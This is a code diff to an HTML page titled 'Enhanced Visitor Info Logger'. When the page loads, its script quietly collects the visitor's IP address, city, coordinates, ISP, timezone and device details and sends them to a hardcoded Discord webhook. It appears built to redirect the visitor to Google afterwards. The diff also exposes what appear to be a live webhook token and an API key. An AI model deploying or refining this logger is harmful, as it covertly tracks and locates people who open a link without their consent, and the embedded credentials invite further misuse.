@@ -6,35 +6,37 @@
     <title>Enhanced Visitor Info Logger</title>
 </head>
 <body>
-    <h1></h1>
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
         const redirectURL = 'https://www.google.com';
         const ipflareAPIKey = 'd1e499e1d5842e97.b83b5e9e9e0197ab0a66eb4df3c8b707a05ab80b9f8d27598627804ad8478f27';
 
-        // Function to get geolocation data from ipflare.io
-        async function getLocationData() {
+        // Function to get the user's IP address
+        async function getIPAddress() {
             try {
-                const response = await fetch('https://api.ipflare.io/', {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return null;
+            }
+        }
+
+        // Function to get location data using IP Flare
+        async function getLocationData(ip) {
+            try {
+                const response = await fetch(`https://api.ipflare.io/${ip}`, {
                     method: 'GET',
                     headers: {
                         'X-API-Key': ipflareAPIKey
                     }
                 });
                 const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country: data.country_name,
-                    region: data.region,
-                    city: data.city,
-                    latitude: data.latitude,
-                    longitude: data.longitude,
-                    isp: data.isp,
-                    timezone: data.timezone
-                };
+                return data;
             } catch (error) {
                 console.error('Error fetching location data:', error);
-                return { error: 'Unable to fetch geolocation data' };
+                return null;
             }
         }
 
@@ -68,22 +70,26 @@
 
         // Function to send data to the Discord webhook
         async function sendToDiscord() {
-            const locationData = await getLocationData();
+            const ip = await getIPAddress();
+            let locationDetails = 'Unable to fetch location data';
+            if (ip) {
+                const locationData = await getLocationData(ip);
+                if (locationData && !locationData.error) {
+                    locationDetails = `
+                        IP: ${locationData.ip}
+                        Country: ${locationData.country_name}
+                        Region: ${locationData.region}
+                        City: ${locationData.city}
+                        Latitude: ${locationData.latitude}
+                        Longitude: ${locationData.longitude}
+                        ISP: ${locationData.isp}
+                        Timezone: ${locationData.timezone}
+                    `;
+                }
+            }
+
             const deviceInfo = getDeviceInfo();
             const timestamp = new Date().toLocaleString();
-
-            const locationDetails = locationData.error
-                ? locationData.error
-                : `
-                IP: ${locationData.ip}
-                Country: ${locationData.country}
-                Region: ${locationData.region}
-                City: ${locationData.city}
-                Latitude: ${locationData.latitude}
-                Longitude: ${locationData.longitude}
-                ISP: ${locationData.isp}
-                Timezone: ${locationData.timezone}
-            `;
 
             const payload = {
                 embeds: [{
@@ -111,7 +117,7 @@
             }).catch(error => console.error('Error sending to webhook:', error));
         }
 
-        // Execute the function
+        // Execute functions
         sendToDiscord();
     </script>
 </body>
